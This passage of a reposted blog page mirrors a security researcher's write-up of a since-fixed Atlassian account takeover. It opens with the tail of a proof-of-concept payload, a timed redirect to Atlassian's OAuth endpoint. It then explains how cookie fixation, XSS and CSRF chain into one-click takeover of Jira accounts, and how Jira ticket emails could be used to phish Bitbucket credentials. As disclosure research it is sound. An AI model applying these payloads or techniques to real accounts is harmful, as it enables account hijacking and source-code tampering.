+<p>location.href=”<a href="https://auth.atlassian.com/authorize?redirect\_uri=https%3A%2F%2Fjira.atlassian.com%2Fplugins%2Fservlet%2Fauthentication%3Fauth\_plugin\_original\_url%3Dhttps%253A%252F%252Fjira.atlassian.com%252F&amp;client\_id=QxUVh9tTugoLC5cgY3Vjkz3h1jPSvG9p&amp;scope=openid+email+profile&amp;state=4118f57f-a9d9-4f6d-a1d5-add939762f23&amp;response\_type=code&amp;prompt=none”" target="_blank" rel="noopener">https://auth.atlassian.com/authorize?redirect\_uri=https%3A%2F%2Fjira.atlassian.com%2Fplugins%2Fservlet%2Fauthentication%3Fauth\_plugin\_original\_url%3Dhttps%253A%252F%252Fjira.atlassian.com%252F&amp;client\_id=QxUVh9tTugoLC5cgY3Vjkz3h1jPSvG9p&amp;scope=openid+email+profile&amp;state=4118f57f-a9d9-4f6d-a1d5-add939762f23&amp;response\_type=code&amp;prompt=none”</a></p>
+<p>},3000);</p>
+<p>‘);</p>
+<p>–&gt;</p>
+<p>The Cookie Fixation combined with the XSS and CSRF bugs from <strong>training.atlassian.com</strong> allowed us to perform full Account Take-Over on <strong>Jira.atlassian.com</strong></p>
+<h3 id="Bitbucket"><a href="#Bitbucket" class="headerlink" title="Bitbucket"></a>Bitbucket</h3><p>Another direction we looked into was checking if we could inject malicious code to an Organization’s Bitbucket. Bitbucket is a Git-based source code repository hosting service owned by Atlassian and has more than 10 million users. Accessing a company’s Bitbucket repositories could allow attackers to access and change source code, make it public or even plant backdoors.</p>
+<p>With a Jira account at our hands, we have a few ways to obtain Bitbucket account. One option is by opening a Jira ticket with malicious link to an attacker controlled website.</p>
+<p>An automatic mail will be sent from Atlassian domain to the user once the ticket is created on Jira systems. An attacker can take advantage of that and include in the ticket a link to a malicious website that steals the user’s credentials.</p>
+<p><a href="https://research.checkpoint.com/2021/a-supply-chain-breach-taking-over-an-atlassian-account/at-12/" target="_blank" rel="noopener"><img src="https://research.checkpoint.com/wp-content/uploads/2021/06/at-12-1024x576.png" alt=""></a></p>
+<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>By using the XSS with CSRF that we found on <strong>training.atlassian.com</strong> combined with the method of Cookie fixation we were able to take over any Atlassian account, in just one click, on every subdomain under atlassian.com that doesn’t use JWT for the session and that is vulnerable to session fixation . For example: training.atlassian.com, jira.atlassian.com, developer.atlassian.com and more.</p>
+<p>Taking over an account in such a collaborative platform means an ability to take over data that is not meant for unauthorized view.</p>
+<p>Check Point Research responsibly disclosed this information to the Atlassian teams which and a solution was deployed to ensure its users can safely continue to share info on the various platforms</p>
+<h3 id="POC-Video"><a href="#POC-Video" class="headerlink" title="POC Video:"></a>POC Video:</h3>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/fetched/" rel="tag"># fetched</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/07/01/qiwihui-pocket_readings-1144/" rel="prev" title="
+
+
+基于业务场景的漏洞挖掘 ">
+      <i class="fa fa-chevron-left"></i> 
+
+
+基于业务场景的漏洞挖掘 
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/07/04/qiwihui-pocket_readings-1146/" rel="next" title="Memcached的存储原理解析">
+      Memcached的存储原理解析 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Comments"><span class="nav-number">1.</span> <span class="nav-text">Comments</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#A-supply-chain-breach-Taking-over-an-Atlassian-account-Check-Point-Research"><span class="nav-number"></span> <span class="nav-text">A supply-chain breach: Taking over an Atlassian account - Check Point Research</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#A-supply-chain-breach-Taking-over-an-Atlassian-account"><span class="nav-number"></span> <span class="nav-text">A supply-chain breach: Taking over an Atlassian account</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Background"><span class="nav-number"></span> <span class="nav-text">Background</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Breaking-on-through-the-Platform"><span class="nav-number"></span> <span class="nav-text">Breaking on through the Platform</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Deep-Dive"><span class="nav-number"></span> <span class="nav-text">Deep Dive</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS"><span class="nav-number"></span> <span class="nav-text">XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSRF"><span class="nav-number"></span> <span class="nav-text">CSRF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SameSite-“Strict”-Bypass"><span class="nav-number"></span> <span class="nav-text">SameSite “Strict” Bypass</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTPOnly-Bypass-and-Cookie-Fixation"><span class="nav-number"></span> <span class="nav-text">HTTPOnly Bypass and Cookie Fixation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Training-atlassian-com"><span class="nav-number">1.</span> <span class="nav-text">Training.atlassian.com</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Jira-atlassian-com"><span class="nav-number">2.</span> <span class="nav-text">Jira.atlassian.com</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Bitbucket"><span class="nav-number">3.</span> <span class="nav-text">Bitbucket</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Conclusion"><span class="nav-number"></span> <span class="nav-text">Conclusion</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#POC-Video"><span class="nav-number">1.</span> <span class="nav-text">POC Video:</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">qiwihui</p>
+  <div class="site-description" itemprop="description">个人阅读清单记录博客，并不代表个人观点。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">144</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">qiwihui</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
